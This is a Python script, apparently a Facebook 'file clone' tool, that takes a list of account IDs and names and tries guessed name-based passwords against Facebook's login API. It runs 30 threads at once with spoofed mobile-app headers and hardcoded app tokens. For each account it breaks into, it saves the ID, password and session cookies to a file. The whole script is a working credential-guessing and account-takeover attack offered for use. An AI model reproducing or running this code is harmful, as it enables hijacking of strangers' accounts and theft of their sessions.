import os,bs4,json,sys,time,random,re,subprocess,platform,struct,string,uuid,base64,zlib,httpx
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as sop
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as ThreadPool 
import requests
try:
    import concurrent.futures
except ImportError:
    os.system('pip install futures')

try: 
    import bs4
except ImportError:
    os.system('pip install bs4')

orange = "\x1b[38;5;196m"
yellow = "\x1b[38;5;208m"
black="\033[1;30m"
rad="\x1b[38;5;160m"
green="\x1b[38;5;46m"
yelloww="\033[1;33m"
blue="\033[38;5;6m"
purple="\033[1;35m"
cyan="\033[1;36m"
white="\033[1;37m"
faltu = "\033[1;47m"
pvt = "\033[1;0m"
gren = "\x1b[38;5;154m"
gas = "\033[1;32m"
my_color = [white,blue,green];warna = random.choice(my_color)
sys.stdout.write('\x1b]2;[★] SOBUJ\x07')
loop = 0
oks = []
cps = []
id = []
ck = []
sasi = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
tete = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
now = datetime.now()
hari = now.day
blx = now.month
try:
    if blx < 0 or blx > 12:exit()
    xx = blx - 1
except ValueError:exit()
bulan = sasi[xx]
tahun = now.year
today = '\x1b[38;5;46m'+str(hari)+'\033[1;97m-\x1b[38;5;46m'+str(bulan)+''
#━━━━[ UA SERVER]━━━━#
version = httpx.get("https://raw.githubusercontent.com/Sobuj-Ahamed/SOBUJ-XD/main/version.txt").text.strip()
M1 = httpx.get("https://raw.githubusercontent.com/Rimon-mim-143/Tool-Menu-/main/M1.txt").text.strip()
M2 = httpx.get("https://raw.githubusercontent.com/Rimon-mim-143/Tool-Menu-/main/M2.txt").text.strip()
#━━━━[ BANNER/LOGO ]━━━━#
def logo():
    if "win" in sys.platform:os.system("cls")
    else:os.system("clear")
    print(f"""  \x1b[38;5;43m
  SSS   OOO  BBBB  U   U     J 
 S     O   O B   B U   U     J 
\033[1;37m  SSS  O   O BBBB  U   U     J 
\x1b[38;5;43m     S O   O B   B U   U J   J 
 SSSS   OOO  BBBB   UUU   JJJ
{rad}--------------------------------------
{rad}[{white}★{rad}] {green}OWNER      {white}>>{green} AS SOBUJ
{rad}[{white}★{rad}] {green}VERSION    {white}>> {green}{version}
{rad}[{white}★{rad}] {green}TODAY DATE {white}>> {green}{today}
{rad}--------------------------------------""")

#━━━━[ LINE ]━━━━#
def line():
        print(f"{rad}--------------------------------------")

#━━━━[ MAIN ]━━━━#
def ____Main___():
    logo()
    print(f'{rad}[{white}A{rad}] {green}FILE CLONE')
    print(f'{rad}[{white}B{rad}] {green}EXIT TOOL');line()
    ___ABIR___ = input(f'{rad}[{white}★{rad}] {green}CHOICE {white} >> {cyan}')
    if ___ABIR___ in ['A','a','01','1']:FILE()
    else:print(f'\n [×]{rad} Wrong option... ');____Main___()


def FILE():
    global oks,cps
    logo()
    print(f"{rad}[{white}★{rad}] {green}EXAMPLE {white}>> {rad}sdcard/sobuj.txt");line()
    dfile = input(f'{rad}[{white}★{rad}] {green}ENTER FILE NAME {white}>> {green}');line()
    os.system('clear')
    logo()
    try:
        dx = open(dfile,'r').read().splitlines()
    except FileNotFoundError:
        print(f'{rad}[×] FILE NOT FOUND...');time.sleep(1);FILE()
    except PermissionError:
        exit(f"\n{rad} allow the permission ... ")
    print(f'{rad}[{white}A{rad}] {green}METHOD M1')
    print(f'{rad}[{white}B{rad}] {green}METHOD M2');line()
    MTDABIR = input(f"{rad}[{white}★{rad}] {green}CHOICE {white}>> {cyan}");logo()
    dplist = []
    try:
        pass_lmit = int(input(f'{rad}[{white}★{rad}] {green}ENTER PASS LIMITS {white}>> {cyan}'));line()
    except:
        pass_lmit = 5
    for i in range(pass_lmit):
        dplist.append(input(f'{rad}[{white}★{rad}] {green}PASSWORD NO.{i+1} {white}>> {cyan}'))
    with ThreadPool(max_workers=30) as Abir:
        logo();total_ids = str(len(dx))
        print(f'{rad}[{white}★{rad}] {green}TOTAL IDS  {white}>> \x1b[38;5;38m{total_ids}')
        print(f'{rad}[{white}★{rad}] {green}IF NO RESULT [{white}On/Off{green}] AIRPLANE MODE')
        line()
        for user in dx:
            ids,names = user.split('|')
            passlist = dplist
            if MTDABIR in ["A","a","1","01"]:
                Abir.submit(__MTDONE__,ids,names,passlist,total_ids)
            elif MTDABIR in ["B","b","2","02"]:
                Abir.submit(__MTDTWO__,ids,names,passlist,total_ids)
            else:
                Abir.submit(__MTDONE__,ids,names,passlist,total_ids)
    print('');line()
    print(f"{rad}[{white}★{rad}] {green}THE PROCESS HAS COMPLETE")
    print(f"{rad}[{white}★{rad}] {green}TOTAL OK  {white}>> {green}{len(oks)}")
    print(f"{rad}[{white}★{rad}] {green}TOTAL CP  {white}>> {green}{len(cps)}")
    line()
    print(f"{rad}[{white}★{rad}] {green}PRESS ENTER GO TO HOME PAGE....  ");____Main___()
    line();exit()

def __MTDONE__(ids,names,passlist,total_ids):
    global oks,cps,loop
    abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
    sys.stdout.write(f"\r\r{green}SOBUJ-M1{white} >> {abir}{loop}{white} >> {green}OK-{len(oks)}"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2) 
            data = {"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email": ids,"password": pas,"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies": "1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            head = {'User-Agent': '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+";{M1}",'Content-Type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com','X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)),'X-FB-Connection-Type': 'MOBILE.LTE','X-Tigon-Is-Retry': 'False','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
            url = "https://graph.face"+"book.com/au"+"th/lo"+"gin"
            po = requests.post(url,data=data,headers=head).text
            q = json.loads(po)
            if 'session_key' in q:
                cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                print(f"\r\r{green}SOBUJ-OK {white}>> {green}{ids}{white}▶︎{green} {pas}")
                oks.append(ids)
                open('/sdcard/SOBUJ-M1-OK.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                break 
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass 
def __MTDTWO__(ids,names,passlist,total_ids):
    global oks,cps,loop
    abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
    sys.stdout.write(f"\r\r{green}SOBUJ-M2{white} >> {abir}{loop}{white} >> {green}OK-{len(oks)}"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = '123'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
            data = {"adid": str(uuid.uuid4()).upper(),"device_id": str(uuid.uuid4()).upper(),"family_device_id": str(uuid.uuid4()).upper(),"secure_family_device_id": str(uuid.uuid4()).upper(),"access_token": "6628568379|c1e620fa708a1d5696fb991c1bde5662","sdk_version": str(random.randint(1,26)),"email": ids,"password": pas,"sdk": "android","locale": random.choice(["en_US","en_GB","bn_IN","in_ID"]),"generate_session_cookies": "1","sig": random.choice(["214242525262773|1aff16d0c4774caa49d10fbfabb80cdf","438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28","350685531728|62f8ce9f74b12f84c123cc23437a4a32","6628568379|c1e620fa708a1d5696fb991c1bde5662","1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae","1217981644879628|65a937f07619e8d4dce239c462a447ce","567067343352427|f249176f09e26ce54212b472dbab8fa8"]),}
            head = {"Host": "gra"+"ph.facebook.com","x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),"x-fb-sim-hni": str(random.randint(20000, 40000)),"x-fb-net-hni": str(random.randint(20000, 40000)),"x-fb-connection-quality": "EXCELLENT","content-type": "application/x-www-form-urlencoded","x-fb-http-engine": "Liger",'User-Agent': '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+";{M2}",}
            url = 'https://graph.facebook.com/auth/login'
            po = requests.post(url,data=data,headers=head).text
            q = json.loads(po)
            if 'session_key' in q:
                cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                print(f"\r\r{green}SOBUJ-OK {white}>> {green}{ids}{white}▶︎{green} {pas}")
                oks.append(ids)
                open('/sdcard/SOBUJ-M2-OK.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                break 
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass
if __name__=="__main__":
    ____Main___()
